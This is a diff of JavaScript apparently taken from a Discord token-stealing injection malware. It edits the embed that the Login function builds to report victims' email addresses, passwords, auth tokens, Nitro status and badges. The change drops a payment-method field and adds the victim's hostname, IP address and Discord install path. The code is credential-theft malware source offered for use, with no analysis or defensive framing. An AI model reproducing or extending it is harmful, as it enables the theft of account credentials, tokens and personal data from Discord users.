@@ -149,6 +149,7 @@ function Login(email, password, token) {
                     "fields": [
                         {
                             "name": "**Account Info**",
+
                             "value": `**Email:** ||${email}|| 
                                      
 				                     **Password:** ||${password}||`,
@@ -156,30 +157,16 @@ function Login(email, password, token) {
                         },
                         {
                             "name": "**Other Info**",
+
                             "value": `**Nitro Type:** ${GetNitro(json.premium_type)}\n
+
                            **Badges:** ${GetBadges(json.flags)}`,
-                            "inline": false
+
+                            "value": `\`\`\`Hostname: \n${computerName}\nIP: \n${o}\nInjection Info: \n${discordInstall}\n\`\`\``, inline: !1 
+
+        
                         },
-                        {
-                            name: "Billing",
-                            value: `${(function () {
-                                const e = JSON.parse(s);
-                                var t = "";
-                                return (
-                                    e.forEach((e) => {
-                                        if ("" == e.type) return "`❌`";
-                                        if (2 == e.type && 1 != e.invalid) t += "`✔️` <:paypal:896441236062347374>";
-                                        else {
-                                            if (1 != e.type || 1 == e.invalid) return "`❌`";
-                                            t += "`✔️` :credit_card:";
-                                        }
-                                    }),
-                                    "" == t && (t = "`❌`"),
-                                    t
-                                );
-                            })()}`,
-                            inline: !1,
-                        },
+                        
                         {
                             "name": "**Token**",
                             "value": `\`${token}\``,
